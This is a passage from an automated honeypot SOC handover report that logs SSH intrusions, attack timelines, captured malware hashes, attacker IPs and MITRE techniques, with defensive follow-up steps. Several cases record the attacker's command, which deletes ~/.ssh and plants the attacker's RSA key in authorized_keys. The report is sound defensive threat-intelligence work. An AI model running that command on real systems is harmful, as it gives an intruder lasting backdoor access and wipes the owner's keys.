| `2026-05-24 18:58:33` | `cowrie.session.connect` |
| `2026-05-24 18:58:33` | `cowrie.client.version` |
| `2026-05-24 18:58:33` | `cowrie.client.kex` |
| `2026-05-24 18:58:33` | `cowrie.login.success` |
| `2026-05-24 18:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4b72a705a0

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:02 |
| **Last Seen** | 2026-05-24 19:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:02:43` | `cowrie.session.connect` |
| `2026-05-24 19:02:43` | `cowrie.client.version` |
| `2026-05-24 19:02:43` | `cowrie.client.kex` |
| `2026-05-24 19:02:43` | `cowrie.login.success` |
| `2026-05-24 19:02:44` | `cowrie.session.params` |
| `2026-05-24 19:02:44` | `cowrie.command.input` |
| `2026-05-24 19:02:44` | `cowrie.command.failed` |
| `2026-05-24 19:02:44` | `cowrie.log.closed` |
| `2026-05-24 19:02:44` | `cowrie.session.params` |
| `2026-05-24 19:02:44` | `cowrie.command.input` |
| `2026-05-24 19:02:44` | `cowrie.session.file_download` |
| `2026-05-24 19:02:44` | `cowrie.log.closed` |
| `2026-05-24 19:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48b50981a45

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:02 |
| **Last Seen** | 2026-05-24 19:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:02:45` | `cowrie.session.connect` |
| `2026-05-24 19:02:45` | `cowrie.client.version` |
| `2026-05-24 19:02:46` | `cowrie.client.kex` |
| `2026-05-24 19:02:46` | `cowrie.login.success` |
| `2026-05-24 19:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-708536721abe

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:10 |
| **Last Seen** | 2026-05-24 19:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:10:55` | `cowrie.session.connect` |
| `2026-05-24 19:10:55` | `cowrie.client.version` |
| `2026-05-24 19:10:55` | `cowrie.client.kex` |
| `2026-05-24 19:10:55` | `cowrie.login.success` |
| `2026-05-24 19:10:55` | `cowrie.session.params` |
| `2026-05-24 19:10:55` | `cowrie.command.input` |
| `2026-05-24 19:10:55` | `cowrie.command.failed` |
| `2026-05-24 19:10:55` | `cowrie.log.closed` |
| `2026-05-24 19:10:55` | `cowrie.session.params` |
| `2026-05-24 19:10:55` | `cowrie.command.input` |
| `2026-05-24 19:10:55` | `cowrie.session.file_download` |
| `2026-05-24 19:10:55` | `cowrie.log.closed` |
| `2026-05-24 19:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806a0a5ec47e

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:10 |
| **Last Seen** | 2026-05-24 19:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:10:57` | `cowrie.session.connect` |
| `2026-05-24 19:10:57` | `cowrie.client.version` |
| `2026-05-24 19:10:57` | `cowrie.client.kex` |
| `2026-05-24 19:10:57` | `cowrie.login.success` |
| `2026-05-24 19:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fdb31ac000b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:19 |
| **Last Seen** | 2026-05-24 19:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:19:09` | `cowrie.session.connect` |
| `2026-05-24 19:19:09` | `cowrie.client.version` |
| `2026-05-24 19:19:09` | `cowrie.client.kex` |
| `2026-05-24 19:19:10` | `cowrie.login.success` |
| `2026-05-24 19:19:10` | `cowrie.session.params` |
| `2026-05-24 19:19:10` | `cowrie.command.input` |
| `2026-05-24 19:19:10` | `cowrie.command.failed` |
| `2026-05-24 19:19:10` | `cowrie.log.closed` |
| `2026-05-24 19:19:10` | `cowrie.session.params` |
| `2026-05-24 19:19:10` | `cowrie.command.input` |
| `2026-05-24 19:19:10` | `cowrie.session.file_download` |
| `2026-05-24 19:19:10` | `cowrie.log.closed` |
| `2026-05-24 19:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6905c1bfbf6e

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-24 19:19 |
| **Last Seen** | 2026-05-24 19:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 19:19:12` | `cowrie.session.connect` |
| `2026-05-24 19:19:12` | `cowrie.client.version` |
| `2026-05-24 19:19:12` | `cowrie.client.kex` |
| `2026-05-24 19:19:12` | `cowrie.login.success` |
| `2026-05-24 19:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `161.35.217[.]121` | **36** | 2026-05-24 17:56 | 2026-05-24 19:20 | 49m | 0 | `T1592` | 🟠 MEDIUM |
| `103.18.14[.]90` | **25** | 2026-05-24 18:29 | 2026-05-24 18:35 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `203.101.186[.]176` | **25** | 2026-05-24 18:02 | 2026-05-24 18:08 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `200.194.181[.]113` | **18** | 2026-05-24 17:11 | 2026-05-24 18:20 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.47.156[.]21` | **13** | 2026-05-24 18:28 | 2026-05-24 19:19 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.172.180[.]124` | **7** | 2026-05-24 17:10 | 2026-05-24 19:07 | 1m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.17.101[.]227` | **6** | 2026-05-24 17:09 | 2026-05-24 18:34 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `94.178.187[.]193` | **4** | 2026-05-24 18:19 | 2026-05-24 18:27 | 8m | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]49` | **3** | 2026-05-24 17:08 | 2026-05-24 18:03 | 6m | 0 | `T1592` | 🟢 LOW |
| `166.62.88[.]46` | **3** | 2026-05-24 17:17 | 2026-05-24 17:56 | 1m | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | **3** | 2026-05-24 17:10 | 2026-05-24 18:11 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.89.76[.]249` | 1 | 2026-05-24 17:35 | 2026-05-24 17:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.141.72[.]65` | 1 | 2026-05-24 18:55 | 2026-05-24 18:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.132.231[.]42` | 1 | 2026-05-24 18:01 | 2026-05-24 18:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.250.89[.]44` | 1 | 2026-05-24 17:58 | 2026-05-24 17:58 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `198.72.133[.]186` | 1 | 2026-05-24 18:56 | 2026-05-24 18:58 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `161.35.217[.]121` | DE | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `198.72.133[.]186` | US | Charter Communications Inc | **100** ⚠️ | 5 |
| `113.141.72[.]65` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 3 |
| `114.132.231[.]42` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 3 |
| `200.194.181[.]113` | BR | Flt Solutions Telecom | **100** ⚠️ | 7 |
| `172.172.180[.]124` | US | Microsoft Limited | **100** ⚠️ | 14 |
| `101.47.156[.]21` | SG | BYTEPLUS | **100** ⚠️ | 0 |
| `166.62.88[.]46` | US | GoDaddy.com, LLC | **100** ⚠️ | 0 |
| `118.122.147[.]49` | CN | CHINANET Sichuan province network | **100** ⚠️ | 0 |
| `94.178.187[.]193` | UA | JSC Ukrtelecom | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 82 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 39 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 33 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 8 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 198 cases |
| Tool 34  | Credential Extractor        | ✅ 72 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (8.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 33 priority case(s) shown individually · 16 recon entry/entries in table (11 group(s) consolidating 143 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-24T19:22:45Z_
